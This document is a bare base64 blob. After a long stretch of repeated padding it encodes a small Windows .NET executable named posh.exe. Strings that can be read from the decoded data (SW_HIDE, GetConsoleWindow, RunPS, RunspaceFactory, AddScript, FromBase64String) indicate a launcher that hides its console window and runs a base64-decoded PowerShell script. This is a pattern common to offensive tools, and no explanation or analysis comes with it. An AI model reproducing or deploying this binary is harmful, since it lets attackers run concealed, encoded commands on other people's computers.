QBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQ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wBJAPYBOABBADUCYAAxADwCIQBhAF4AIQAMAIUCcAAUAJMCgABhAJ8ChQB5AMUCiwCBANoCIQAJAOICjwCJAPICjwCRAAADrgCZABQDswCRACUDuQAIAAQADQAIAAgAEgAuAAsAvwAuABMAyAA9AJMAJwE0AWkAeQAAAQMAQgABAAABBQBTAAIABIAAAAAAAAAAAAAAAAAAAAAA8AAAAAQAAAAAAAAAAAAAAAEAGwAAAAAAAQAAAAAAAAAAAAAAQgA/AQAAAAACAAAAAAAAAAAAAAABABsAAAAAAAAAAAAAPE1vZHVsZT4AcG9zaC5leGUAUHJvZ3JhbQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFNXX0hJREUAU1dfU0hPVwBHZXRDb25zb2xlV2luZG93AFNob3dXaW5kb3cALmN0b3IASW52b2tlQXV0b21hdGlvbgBSdW5QUwBNYWluAGhXbmQAbkNtZFNob3cAY21kAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwb3NoAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIuZGxsAHVzZXIzMi5kbGwAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbgBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcwBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBSdW5zcGFjZUludm9rZQBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEAUFNPYmplY3QASW52b2tlAENsb3NlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMASUVudW1lcmF0b3JgMQBHZXRFbnVtZXJhdG9yAGdldF9DdXJyZW50AEFwcGVuZ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